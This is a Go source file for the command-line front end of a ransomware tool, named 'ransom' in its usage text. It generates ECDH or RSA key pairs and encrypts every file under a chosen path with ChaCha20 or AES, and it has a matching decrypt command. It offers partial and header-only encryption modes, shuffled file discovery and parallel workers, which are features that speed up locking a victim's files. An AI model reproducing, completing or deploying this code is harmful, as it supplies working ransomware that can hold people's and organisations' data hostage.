package main

import (
	"crypto/x509"
	"encoding/pem"
	"flag"
	"fmt"
	"log"
	"os"
	"runtime"
	"strings"
	"sync/atomic"

	"byor/pkg/cipher"
	"byor/pkg/discovery"
	"byor/pkg/processor"
	"byor/pkg/strategy"
	"byor/pkg/worker"
)

var ciphers map[string]cipher.Cipher

func main() {
	if len(os.Args) < 2 {
		printUsage()
		os.Exit(1)
	}

	switch os.Args[1] {
	case "keygen":
		keygenCmd := flag.NewFlagSet("keygen", flag.ExitOnError)
		keyType := keygenCmd.String("type", "ecdh", "Type of key to generate (ecdh or rsa)")
		keygenCmd.Parse(os.Args[2:])
		handleKeygen(*keyType)
	case "encrypt":
		handleEncrypt()
	case "decrypt":
		handleDecrypt()
	default:
		printUsage()
		os.Exit(1)
	}
}

func handleKeygen(keyType string) {
	switch keyType {
	case "ecdh":
		priv, pub, err := cipher.GenerateEcdhKeyPair()
		if err != nil {
			log.Fatalf("Failed to generate ECDH key pair: %v", err)
		}
		if err := os.WriteFile("private.key", priv.Bytes(), 0600); err != nil {
			log.Fatalf("Failed to write private key: %v", err)
		}
		if err := os.WriteFile("public.key", pub.Bytes(), 0644); err != nil {
			log.Fatalf("Failed to write public key: %v", err)
		}
		fmt.Println("Successfully generated private.key and public.key")
	case "rsa":
		priv, err := cipher.GenerateRSAKeyPair()
		if err != nil {
			log.Fatalf("Failed to generate RSA key pair: %v", err)
		}

		privBytes := x509.MarshalPKCS1PrivateKey(priv)
		privPem := &pem.Block{Type: "RSA PRIVATE KEY", Bytes: privBytes}
		privFile, err := os.Create("private.pem")
		if err != nil {
			log.Fatalf("Failed to create rsa private key file: %v", err)
		}
		defer privFile.Close()
		if err := pem.Encode(privFile, privPem); err != nil {
			log.Fatalf("Failed to write rsa private key to file: %v", err)
		}

		pubBytes, err := x509.MarshalPKIXPublicKey(&priv.PublicKey)
		if err != nil {
			log.Fatalf("Failed to marshal rsa public key: %v", err)
		}
		pubPem := &pem.Block{Type: "PUBLIC KEY", Bytes: pubBytes}
		pubFile, err := os.Create("public.pem")
		if err != nil {
			log.Fatalf("Failed to create rsa public key file: %v", err)
		}
		defer pubFile.Close()
		if err := pem.Encode(pubFile, pubPem); err != nil {
			log.Fatalf("Failed to write rsa public key to file: %v", err)
		}
		fmt.Println("Successfully generated private.pem and public.pem")
	default:
		log.Fatalf("Invalid key type: %s. Use 'ecdh' or 'rsa'.", keyType)
	}
}

func handleEncrypt() {
	encryptCmd := flag.NewFlagSet("encrypt", flag.ExitOnError)
	path := encryptCmd.String("path", "", "Path to encrypt.")
	crypterType := encryptCmd.String("crypter", "ecdh-chacha20", "Crypter to use (ecdh-chacha20 or rsa-aes)")
	pubKeyPath := encryptCmd.String("key", "", "Path to public key file.")
	modeStr := encryptCmd.String("mode", strategy.ModeIntelligentStr, "Encryption mode (intelligent, full, header, partial)")
	partialPercent := encryptCmd.Int("partial-percent", 10, "Percentage of file to encrypt in each block for partial mode")
	partialBlocks := encryptCmd.Int("partial-blocks", 3, "Number of blocks to encrypt for partial mode")
	workers := encryptCmd.Int("workers", runtime.GOMAXPROCS(0), "Number of concurrent workers.")
	discoveryStrategyStr := encryptCmd.String("discovery", "default", "File discovery strategy (default, intelligent, shuffle)")
	encryptCmd.Parse(os.Args[2:])

	if *path == "" {
		log.Fatal("Path is required for encryption.")
	}

	c, err := initEncryptCrypter(*crypterType, *pubKeyPath)
	if err != nil {
		log.Fatalf("Failed to initialize crypter: %v", err)
	}

	strategy, err := parseStrategy(*modeStr, *partialPercent, *partialBlocks)
	if err != nil {
		log.Fatalf("Invalid strategy: %v", err)
	}

	discoveryStrategy, err := parseDiscoveryStrategy(*discoveryStrategyStr)
	if err != nil {
		log.Fatalf("Invalid discovery strategy: %v", err)
	}

	action := func(filePath string) error {
		return processor.EncryptFile(filePath, c, &strategy)
	}

	processFiles(*path, *workers, discoveryStrategy, action)
}

func handleDecrypt() {
	decryptCmd := flag.NewFlagSet("decrypt", flag.ExitOnError)
	path := decryptCmd.String("path", "", "Path to decrypt.")
	ecdhKeyPath := decryptCmd.String("ecdh-key", "private.key", "Path to ECDH private key.")
	rsaKeyPath := decryptCmd.String("rsa-key", "private.pem", "Path to RSA private key.")
	workers := decryptCmd.Int("workers", runtime.GOMAXPROCS(0), "Number of concurrent workers.")
	decryptCmd.Parse(os.Args[2:])

	if *path == "" {
		log.Fatal("Path is required for decryption.")
	}

	err := initDecryptCrypters(*ecdhKeyPath, *rsaKeyPath)
	if err != nil {
		log.Fatalf("Failed to initialize crypters for decryption: %v", err)
	}

	action := func(filePath string) error {
		return processor.DecryptFile(filePath, ciphers)
	}

	processFiles(*path, *workers, discovery.Default, action)
}

// --- Helper Functions ---

func initEncryptCrypter(crypterType, pubKeyPath string) (cipher.Cipher, error) {
	var c cipher.Cipher
	var err error
	var keyFile string

	switch crypterType {
	case "ecdh-chacha20":
		keyFile = "public.key"
		if pubKeyPath != "" {
			keyFile = pubKeyPath
		}
		pubKeyBytes, errRead := os.ReadFile(keyFile)
		if errRead != nil {
			return nil, fmt.Errorf("failed to read ecdh public key: %w", errRead)
		}
		c, err = cipher.NewEcdhChaCha20WithPublicKey(pubKeyBytes)
	case "rsa-aes":
		keyFile = "public.pem"
		if pubKeyPath != "" {
			keyFile = pubKeyPath
		}
		pubKeyBytes, errRead := os.ReadFile(keyFile)
		if errRead != nil {
			return nil, fmt.Errorf("failed to read rsa public key: %w", errRead)
		}
		c, err = cipher.NewRsaAesWithPublicKey(pubKeyBytes)
	default:
		return nil, fmt.Errorf("invalid crypter type: %s. Use 'ecdh-chacha20' or 'rsa-aes'", crypterType)
	}
	return c, err
}

func initDecryptCrypters(ecdhKeyFile, rsaKeyFile string) error {
	ciphers = make(map[string]cipher.Cipher)

	// Init ECDH Crypter
	ecdhKeyBytes, err := os.ReadFile(ecdhKeyFile)
	if err == nil {
		c, errInit := cipher.NewEcdhChaCha20WithPrivateKey(ecdhKeyBytes)
		if errInit == nil {
			ciphers[c.Name()] = c
		}
	}

	// Init RSA Crypter
	rsaKeyBytes, err := os.ReadFile(rsaKeyFile)
	if err == nil {
		c, errInit := cipher.NewRsaAesWithPrivateKey(rsaKeyBytes)
		if errInit == nil {
			ciphers[c.Name()] = c
		}
	}

	if len(ciphers) == 0 {
		return fmt.Errorf("could not initialize any crypters for decryption; check key paths")
	}
	return nil
}

func parseStrategy(modeStr string, pPercent, pBlocks int) (strategy.Strategy, error) {
	var s strategy.Strategy
	switch strings.ToLower(modeStr) {
	case strategy.ModeIntelligentStr:
		s.Mode = strategy.ModeIntelligent
	case strategy.ModeFullStr:
		s.Mode = strategy.ModeFull
	case strategy.ModeHeaderStr:
		s.Mode = strategy.ModeHeader
	case strategy.ModePartialStr:
		s.Mode = strategy.ModePartial
		s.PartialPercent = pPercent
		s.PartialBlocks = pBlocks
	default:
		return s, fmt.Errorf("invalid encryption mode: %s", modeStr)
	}
	return s, nil
}

func parseDiscoveryStrategy(s string) (discovery.Strategy, error) {
	switch strings.ToLower(s) {
	case "default":
		return discovery.Default, nil
	case "intelligent":
		return discovery.Intelligent, nil
	case "shuffle":
		return discovery.Shuffle, nil
	default:
		return 0, fmt.Errorf("invalid discovery strategy: %s", s)
	}
}

func processFiles(rootPath string, numWorkers int, ds discovery.Strategy, action func(string) error) {
	var processed, failed int64

	p := worker.New(numWorkers, func(job worker.Job) error {
		err := action(string(job))
		if err != nil {
			atomic.AddInt64(&failed, 1)
			log.Printf("Error processing %s: %v", job, err)
		} else {
			atomic.AddInt64(&processed, 1)
		}
		fmt.Printf("\rProcessed: %d, Failed: %d", atomic.LoadInt64(&processed), atomic.LoadInt64(&failed))
		return err
	})

	p.Run()
	fmt.Printf("\nStarting file discovery in %s with %d workers...\n", rootPath, numWorkers)
	go func() {
		discoverer := discovery.NewDiscoverer(ds, p)
		if err := discoverer.DiscoverFiles(rootPath); err != nil {
			log.Fatalf("File discovery failed: %v", err)
		}
	}()

	for range p.Results() {
		// Drain results channel
	}

	fmt.Printf("\n\nProcessing complete.\n")
	fmt.Printf("Successfully processed: %d\n", atomic.LoadInt64(&processed))
	fmt.Printf("Failed: %d\n", atomic.LoadInt64(&failed))
}

func printUsage() {
	fmt.Println("Usage: ransom <command> [options]")
	fmt.Println("\nCommands:")
	fmt.Println("  keygen -type=<ecdh|rsa>")
	fmt.Println("  encrypt -path=<dir> [encryption_options]")
	fmt.Println("  decrypt -path=<dir> [decryption_options]")
	fmt.Println("\nEncryption Options:")
	fmt.Println("  -crypter : Crypter to use (ecdh-chacha20 or rsa-aes). Default: ecdh-chacha20.")
	fmt.Println("  -key     : Path to public key file.")
	fmt.Println("  -mode    : Encryption mode (intelligent, full, header, partial). Default: intelligent.")
	fmt.Println("  -discovery: File discovery strategy (default, intelligent, shuffle). Default: default.")
	fmt.Println("  -partial-percent : For partial mode, percentage of each block to encrypt. Default: 10.")
	fmt.Println("  -partial-blocks  : For partial mode, number of blocks to encrypt. Default: 3.")
	fmt.Println("\nDecryption Options:")
	fmt.Println("  -ecdh-key : Path to the ECDH private key. Default: private.key.")
	fmt.Println("  -rsa-key  : Path to the RSA private key. Default: private.pem.")
	fmt.Println("\nRun 'ransom <command> -h' for more details.")
}
